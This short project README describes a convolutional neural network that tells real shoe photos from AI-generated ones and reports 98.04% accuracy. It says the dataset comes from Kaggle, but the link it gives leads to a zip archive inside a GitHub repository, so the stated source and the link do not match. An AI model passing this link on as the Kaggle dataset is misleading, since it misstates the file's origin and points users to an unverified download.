# Image Classification of Real vs. AI Generated Shoe Using CNN

The project "Image Classification of Real vs. AI-Generated Shoes Using Convolutional Neural Network" utilizes a convolutional neural network (CNN) model to distinguish between images of real shoes and those generated by artificial intelligence (AI). The dataset used is sourced from Kaggle, specifically from the "Shoes Dataset: Real and AI Generated Images," which can be accessed via the following link: https://raw.githubusercontent.com/georgywasiat/Image-Classification-of-Real-vs.-AI-Generated-Shoe-Using-CNN/main/summatory/Image-Classification-of-Real-vs.-AI-Generated-Shoe-Using-CNN.zip After the training process, the CNN model achieved a classification accuracy of 98.04%, demonstrating high proficiency in distinguishing between images of real shoes and those generated by AI.
